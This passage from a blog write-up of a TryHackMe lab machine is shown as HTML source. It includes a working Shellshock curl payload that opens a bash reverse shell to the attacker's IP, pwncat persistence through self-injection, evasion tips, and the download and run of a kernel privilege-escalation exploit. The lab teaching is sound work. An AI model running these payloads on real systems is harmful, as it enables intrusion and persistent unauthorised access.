&lt;p&gt;So, we can see we got a meterpreter session here. For a list of the commands previously talked about available in a meterpreter session go &lt;a href=&quot;https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/&quot;&gt;here&lt;/a&gt; (sorry but there are already way too many snippets from my terminal here, and this one would be super big.)&lt;/p&gt;

&lt;p&gt;So as you can see, we have a functional shell. Let‚Äôs talk about the advantages and disadvantages of using metasploit in this scenario:&lt;/p&gt;

&lt;h3 id=&quot;advantages&quot;&gt;Advantages&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Metasploit automatically encrypts the communication between the two machines, so curious blueteam ppl i.e. incident response teams or just regular sysadmins aren‚Äôt gonna be able to just capture packets and see exactly what you‚Äôre doing&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;There are tons of post exploitation options. In a realistic scenario, using metasploit is probably one of the best options here as it makes it a lot easier to establish persistence. We could simply generate a payload using something like msfvenom- upload, and then run. Then for however long the op is, you have access to the network free to poke around&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;It is pretty much better to the traditional netcat reverse shell in every way, because it‚Äôs actually designed for stuff like this. It combats the whole ‚Äúlooking sketch‚Äù thing by naming itself as a random string and running from &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;. This alleviates a lot of the potential suspicion, as &lt;code class=&quot;highlighter-rouge&quot;&gt;/tmp&lt;/code&gt; normally has weird file names inside.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;disadvantages&quot;&gt;Disadvantages&lt;/h3&gt;

&lt;p&gt;There honestly aren‚Äôt a whole lot of disadvantages to using metasploit. My only gripe is that if you rely on it too much, if there is a certain tool you need that either isn‚Äôt on metasploit, or doesn‚Äôt work, then it can be kind of a pain.&lt;/p&gt;

&lt;p&gt;So yea, if you know what you‚Äôre doing and already understand how the exploit functions, use metasploit. Don‚Äôt be that guy on HTB who searches for apache exploits, then runs every DOS vuln on there.&lt;/p&gt;

&lt;h2 id=&quot;pwncat&quot;&gt;Pwncat&lt;/h2&gt;

&lt;p&gt;Lastly I‚Äôll talk about &lt;a href=&quot;https://github.com/cytopia/pwncat&quot;&gt;pwncat&lt;/a&gt;. Obviously there are many options, but these are just some basic options I think every aspiring pentester should at least know about. Pwncat is literally ‚Äúnetcat on steroids‚Äù. It has a ton of awesome functionality, a lot of which is beyond the scope of this blog. But I do encourage those who see this to check it out for themselves :). The main feature of pwncat that we are going to be exploring is the ‚Äúself injection‚Äù and persistance features of pwncat.&lt;/p&gt;

&lt;h3 id=&quot;setuphow-it-works&quot;&gt;Setup/How it works&lt;/h3&gt;

&lt;p&gt;The ‚Äúhow it works‚Äù, for the most part is very smiliar to traditional netcat; you have the attacker listening and then some arbitrary code is executed that causes the victim to connect back. We will still have to issue a command on the target machine to make it connect to our listener- except when a connection is recieved, pwncat will automatically self inject a script into the target computer that will keep attempting to reconnect back to us.&lt;/p&gt;

&lt;h3 id=&quot;lets-get-into-it&quot;&gt;Let‚Äôs get into it&lt;/h3&gt;

&lt;p&gt;Okay so first let‚Äôs install pwncat and start our listener:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~$ pip3 install pwncat
Collecting pwncat
Using cached pwncat-0.1.0-py2.py3-none-any.whl (67 kB)
Installing collected packages: pwncat
Successfully installed pwncat-0.1.0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, that was easy.&lt;/p&gt;

&lt;p&gt;Next let‚Äôs start our listener, just like we did with netcat before (except a little different this time of course).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ pwncat -l 1234 --self-inject /bin/bash:10.9.55.221:1234
[PWNCAT CnC] Checking if remote sends greeting...
bash: cannot set terminal process group (858): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ 
[PWNCAT CnC] Checking if remote sends prefix/suffix to every request...
[PWNCAT CnC] Remote does not send prefix
[PWNCAT CnC] Remote suffix (1 lines):
b'www-data@ubuntu:/usr/lib/cgi-bin$ '
[PWNCAT CnC] Probing for: which python3
[PWNCAT CnC] Potential path: /usr/bin/python3
[PWNCAT CnC] Found valid Python3 version: 3.4.0
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;After that we send the same request we did last time:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/cgi-bin/test.cgi -H &quot;custom:() { ignored; }; /bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.9.55.221/1234 0&amp;gt;&amp;amp;1; &quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And boom! We have a shell!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[PWNCAT CnC] Uploading: /home/jambot/.local/bin/pwncat -&amp;gt; /tmp/tmpkotibkql (1/1)
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Decoding: /tmp/tmpkotibkql -&amp;gt; /tmp/tmpfovm5o_c
Starting pwncat rev shell: nohup /usr/bin/python3 /tmp/tmpfovm5o_c 10.9.55.221 1234 --exec /bin/bash --reconn --reconn-wait 1 &amp;gt; /tmp/tmp480tg67j 2&amp;gt; /tmp/   tmp92mjnjpg &amp;amp;
[PWNCAT CnC] Waiting for socket
[PWNCAT CnC] Flushing receive buffer (this can take some time) ...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Done. Handing over to current shell.
ls
test.cgi
whoami
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, we‚Äôve seen this before, we know how it works -let‚Äôs get to the good part.&lt;/p&gt;

&lt;p&gt;If I exit this shell, normally with netcat I‚Äôd have to perform the exploit again. however as you can see, every 1 second the payload that was uploaded will attempt to connect back to us. This means we can do stuff like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;^Cjambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ pwncat -l 1234 -vv
INFO: Listening on :::1234 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:1234 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.159.177:43996 (family 2/IPv4, TCP)
ls -l
total 4
-rwxr-xr-x 1 root root 73 Sep  2 10:17 test.cgi
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This is great, without having to setup the exploit again, we can just start and end sessions as we please. Super useful for CTF type stuff. Anyways, I don‚Äôt wanna make this writeup too long, so that‚Äôs all of pwncat‚Äôs usage we‚Äôll be covering here, to find out more head over to the pwncat git repo here. If you want to have a more deeper understandings of what‚Äôs going on behind the curtain here, I‚Äôll be making a blog hopefully next week, in which we create our own version of pwncat :)&lt;/p&gt;

&lt;h3 id=&quot;advanatages&quot;&gt;Advanatages&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Persistance. It can be so annoying having to do the same exploit over and overagain, so for CTF‚Äôs it makes it so nice to be able to just start a listenever(nc or pwncat) and just instantly recieve a shell&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;It allows for multiple reverse shells, that are all ultimates and constantlytrying to connect back. This is great because if you‚Äôre for example on a teamworking on some machines, one person who has access can open up multiple ports and have them all connecting to their friends IP‚Äôs&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;An easy alternative to netcat. Metasploit is more fiddly to install and can takea while, it‚Äôs also a lot more bulky and has a ton of depencies. Pwncat is such anicer alternative to netcat for CTF‚Äôs and can easily be installed with a single &lt;code class=&quot;highlighter-rouge&quot;&gt;pip3 install pwncat&lt;/code&gt; command.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Versatility. Pwncat is so much more than just a tool for reverse shells. It supports portscans, local port forwarding, and remote port forwarding.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;disadvantages-1&quot;&gt;Disadvantages&lt;/h3&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;Lack of encryption. Unlike meterpreter sessions, afaik there is no encryption oranything, so anyone smart enough to keep some network logs might be able to see exactly what you done after, or even as you‚Äôre doing it.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;It can look kinda sketchy to anyone looking at the process list. Of course anyone who knows enough, and pays attention enough can spot an out of place process even if it looks like some system process. But all someone has to do is ps aux grep bash and they‚Äôll be shown this:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ps aux |grep bash
  www-data   974  0.2  2.2 187364 11036 ?        Sl   10:16   0:04 /usr/bin         python3 /tmp/tmpvz28iv2h 10.9.55.221 1234 --exec /bin/bash --reconn            --reconn-wait 1
  www-data   975  0.0  0.2  17964  1476 ?        S    10:16   0:00 /bin/bash
  www-data   997  0.2  2.1 187364 10972 ?        Sl   10:26   0:02 /usr/bin         python3 /tmp/tmp5tqqkofv 10.9.55.221 1234 --exec /bin/bash --reconn            --reconn-wait 1
  www-data   998  0.0  0.2  17960  1432 ?        S    10:26   0:00 /bin/bash
  www-data  1010  0.2  2.1 187364 11000 ?        Sl   10:27   0:02 /usr/bin         python3 /tmp/tmpfovm5o_c 10.9.55.221 1234 --exec /bin/bash --reconn            --reconn-wait 1
  www-data  1011  0.0  0.2  17956  1216 ?        S    10:27   0:00 /bin/bash
  www-data  1030  0.0  0.1   8872   644 ?        S    10:46   0:00 grep bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Of course, some people may not know what this is, but more experienced sysadmins would realise something is wrong, and immediately kill these processes which means you‚Äôre not only exposes, but you‚Äôre persistence is no longer there, which means there was no point in using it in the first place&lt;/p&gt;

&lt;h1 id=&quot;user-privilege-escelation-and-root&quot;&gt;User, privilege escelation, and root!&lt;/h1&gt;

&lt;p&gt;So, now that we have our shell- that‚Äôs user done. Simply look in ryan‚Äôs home directory and it‚Äôs there:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{THIS IS NOT A FLAG REEEE}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Next let‚Äôs try some basic privilege escelation techniques.&lt;/p&gt;

&lt;p&gt;First let‚Äôs try to see if we‚Äôre allowed to run anything as root using sudo:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/home/ryan$ sudo -l
[sudo] password for www-data: 

Sorry, try again.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, we don‚Äôt have the www-data password. So we can‚Äôt exploit there. Let‚Äôs try see if it‚Äôs running an outdated version of linux maybe?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/home/ryan$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm, kinda sus ngl üëÄ&lt;/p&gt;

&lt;p&gt;Let‚Äôs see if searchsploit has anything on this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ searchsploit ubuntu 3.13.0
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Exploit Title                                                                                                                         |  Path
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                   | linux/local/37292.c
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)              | linux/local/37293.txt
Linux Kernel 3.4 &amp;lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                 | linux_x86-64/local/    31347.c
Linux Kernel 3.4 &amp;lt; 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                        | linux/local/31346.c
Linux Kernel 4.10.5 / &amp;lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                   | linux/dos/43234.c
Linux Kernel &amp;lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                          | linux/local/45010.c
Linux Kernel &amp;lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                 | linux/local/44298.c
Linux Kernel &amp;lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                      | linux_x86-64/local/    44300.c
Linux Kernel &amp;lt; 4.4.0-83 / &amp;lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                  | linux/local/43418.c
Linux Kernel &amp;lt; 4.4.0/ &amp;lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)              | linux/local/47169.c
Ubuntu &amp;lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                 | linux/local/41760.txt
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Local privilege escalation? Perfect.&lt;/p&gt;

&lt;p&gt;Let‚Äôs copy the binary to our working directory, upload, and then compile and run.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ wget http://10.9.55.221:1000/exploit.c
&amp;lt;ploit.c; gcc exploit.c -o root &amp;amp;&amp;amp; chmod +x root &amp;amp;&amp;amp; ./root                   
--2020-11-07 11:07:26--  http://10.9.55.221:1000/exploit.c
Connecting to 10.9.55.221:1000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: 'exploit.c'

100%[======================================&amp;gt;] 5,119       --.-K/s   in 0.001s  

2020-11-07 11:07:26 (4.71 MB/s) - 'exploit.c' saved [5119/5119]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, that worked.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ gcc exploit.c -o root
gcc: error trying to exec 'cc1': execvp: No such file or directory
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay.. weird. Let‚Äôs just google it?&lt;/p&gt;

&lt;p&gt;So, &lt;a href=&quot;https://stackoverflow.com/questions/11912878/gcc-error-gcc-error-trying-to-exec-cc1-execvp-no-such-file-or-directory&quot;&gt;this&lt;/a&gt; told me that cc1 is just a dependancy of the gcc compiler. And we can‚Äôt apt update because we don‚Äôt have privileged to do so, as seen here:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ apt update
E: Could not open lock file /var/lib/apt/lists/lock - open (13: Permission denied)
E: Unable to lock directory /var/lib/apt/lists/
E: Could not open lock file /var/lib/dpkg/lock - open (13: Permission denied)
E: Unable to lock the administration directory (/var/lib/dpkg/), are you root?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So what can we do instead? We have a few options. We could either download, compile, and upload the dependancy. Or we could see if it‚Äôs already on the machine, and for some reason gcc can‚Äôt see it. Let‚Äôs take a look at the &lt;code class=&quot;highlighter-rouge&quot;&gt;PATH&lt;/code&gt; environment variable maybe?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay yikes. If you don‚Äôt know, this is not what a PATH should ever look like really. If we search for a standard path value, we find this. Let‚Äôs try setting our path to this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ export PATH=/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;OKay, no error or anything, cool. Now let‚Äôs try compiling.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ gcc exploit.c -o root
www-data@ubuntu:/tmp$ ls
exploit.c    tmp5tqqkofv  tmpc6p6bxwg  tmpfwd93y1j  tmpowb2rd28
root	     tmp92mjnjpg  tmpdh9vkjjh  tmpkotibkql  tmpvz28iv2h
tmp480tg67j  tmp96jkt_us  tmpfovm5o_c  tmpkugiuegs
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome! As we can see, we have generated our binary. Let‚Äôs make it executable and then run!&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ chmod +x root &amp;amp;&amp;amp; ./root
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id 
uid=0(root) gid=0(root) groups=0(root),33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, we‚Äôre root! Let‚Äôs get the flag&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# ls -a
.  ..  .bash_history  .bashrc  .profile  root.txt
# cat root.txt
THM{THIS IS NOT A FLAG REEEE}
#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;how-to-know-what-to-do&quot;&gt;How to know what to do&lt;/h2&gt;

&lt;p&gt;A lot of the time, when I started getting into cyber, I‚Äôd see other peoples writeups, and what would take me hours would take them seconds- it seemed like they just magivally knew what to do. I likely would have spent hours trying tons of different things, if I hadn‚Äôt encountered stuff like this before. If you‚Äôre in this position right now, I recommend 1 thing: learn more about how linux works- I‚Äôve been using a variety of linux distributions as my main operating system since I was 11, so I‚Äôd like to imagine that has helped quite a bit.&lt;/p&gt;

&lt;p&gt;Now I‚Äôm sure some people are thinking ‚Äúwell why not just use enum scripts, are you against them or something??‚Äù. To answer that, no, not at all :). In fact I‚Äôm about to go into how to use linpeas. I just include the usage of enum scripts inside of learning how to use linux, as every time you use one, if you see something that could be vulnerable according to the script, and don‚Äôt know how it works/how it can be exploited, you have no other choice but to google and research. I do definitely encourage everyone in the field of cybersec to not only understand some basic linux terminology, but to get a deeper understanding of how it works, and how it can be secured.&lt;/p&gt;

&lt;h2 id=&quot;linpeas&quot;&gt;Linpeas&lt;/h2&gt;

&lt;p&gt;Now I was lucky enough to have seen similar stuff to this before, but incase you hadn‚Äôt, here is an alternative method of locating pirivlege escalation vectors:&lt;/p&gt;

&lt;p&gt;First we want to download linpeas, it can be found &lt;a href=&quot;https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS&quot;&gt;here&lt;/a&gt; :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ git clone https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
Cloning into 'privilege-escalation-awesome-scripts-suite'...
remote: Enumerating objects: 20, done.
remote: Counting objects: 100% (20/20), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 2953 (delta 12), reused 15 (delta 7), pack-reused 2933
Receiving objects: 100% (2953/2953), 14.32 MiB | 8.44 MiB/s, done.
Resolving deltas: 100% (1693/1693), done.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Epic, also be sure to checkout how it works and what it looks for :)&lt;/p&gt;

&lt;p&gt;Next, in order to get the linpeas.sh file onto the server, there are a few methods but we‚Äôll just use the same one as last time. We‚Äôll make a python http server and host the file there, then wget it.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day/privilege-escalation-awesome-scripts-suite$ sudo python -m SimpleHTTPServer 1000
[sudo] password for jambot:                 
Serving HTTP on 0.0.0.0 port 1000 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This makes the http server :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ wget http://10.9.55.221:1000/linPEAS/linpeas.sh
wget http://10.9.55.221:1000/linPEAS/linpeas.sh
--2020-11-07 12:58:46--  http://10.9.55.221:1000/linPEAS/linpeas.sh
Connecting to 10.9.55.221:1000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 296409 (289K) [text/x-sh]
Saving to: 'linpeas.sh'

100%[======================================&amp;gt;] 296,409     1.83MB/s   in 0.2s   

2020-11-07 12:58:46 (1.83 MB/s) - 'linpeas.sh' saved [296409/296409]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So the exact same as last time- we just downloaded a file from my local machine to the server by hosting it on a http server.&lt;/p&gt;

&lt;p&gt;Now it‚Äôs as simple as making it executable and running. :)&lt;/p&gt;

&lt;p&gt;www-data@ubuntu:/tmp$ chmod +x linpeas.sh&lt;/p&gt;

&lt;p&gt;It‚Äôs worth noting that if you can‚Äôt make the file executable or even download it, try in the /tmp or /dev/shm directories.&lt;/p&gt;

&lt;p&gt;Now we run it :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ ./linpeas.sh
./linpeas.sh

Starting linpeas. Caching Writable Folders...

    linpeas v2.9.0 by carlospolop

ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the   responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.

Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
LEGEND:
RED/YELLOW: 99% a PE vector
RED: You must take a look at it
LightCyan: Users with console
Blue: Users without console &amp;amp; mounted devs
Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
LightMangeta: Your username
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The full output is too big for me to put here, however I encourage you to follow along and try this yourself if you‚Äôre fairly new :)&lt;/p&gt;

&lt;p&gt;So, if we had used linpeas, we also would have found the same privilege escalation vector. The kernel version was highlighted in red/yellow, so if the attacker followed the provided legend, they would have known to look into it.&lt;/p&gt;

&lt;h1 id=&quot;not-the-end-yet-&quot;&gt;Not the end yet ;)&lt;/h1&gt;

&lt;p&gt;Okay so I promised a somewhat in depth writeup- so it wouldn‚Äôt be much good if I didn‚Äôt explore some of the other stuff you might have noticed throughout this.&lt;/p&gt;

&lt;h2 id=&quot;secret-directory&quot;&gt;Secret directory&lt;/h2&gt;

&lt;p&gt;In the output from out attempt ar directory enumeration, you may have noticed these:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/robots.txt           (Status: 200) [Size: 38]                                     
/secret               (Status: 301) [Size: 314] [--&amp;gt; http://10.10.152.132/secret/] 
/backup               (Status: 301) [Size: 314] [--&amp;gt; http://10.10.152.132/backup/]                                    
/uploads              (Status: 301) [Size: 315] [--&amp;gt; http://10.10.152.132/uploads/]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;I didn‚Äôt go into these, so I will now :)&lt;/p&gt;

&lt;h3 id=&quot;robots&quot;&gt;Robots&lt;/h3&gt;

&lt;p&gt;Let‚Äôs take a look at robots.txt then :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/robots.txt
You really thought it'd be this easy?
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So, as you can see, we were subject to the ‚Äúepic troll‚Äù attack. This is a common attack done by CTF creators in which they epicly trol the person who thinks robots.txt will net them a flag. To defend against this, I highly recommend being a 1337 HaX0r.&lt;/p&gt;

&lt;p&gt;usBut fr, incase you don‚Äôt know a robots.txt file is usaly a file included in websites, that bots/crawlers will look for so they know which pages not to request. Because of this on rare occasions people include secret files/directories that they don‚Äôt want human discovering, without thinking about the fact that humans can also just simply look at the not-so-secret robots.txt, to find whatever they aim to hide.&lt;/p&gt;

&lt;h3 id=&quot;secret&quot;&gt;Secret&lt;/h3&gt;

&lt;p&gt;Once again let‚Äôs use curl to send a &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt; request to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://10.10.159.177/secret&lt;/code&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/challenges/tryhackme/0day$ curl http://10.10.159.177/secret
&lt;span class=&quot;cp&quot;&gt;&amp;lt;!DOCTYPE HTML PUBLIC &quot;-//IETF//DTD HTML 2.0//EN&quot;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;301 Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;Moved Permanently&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
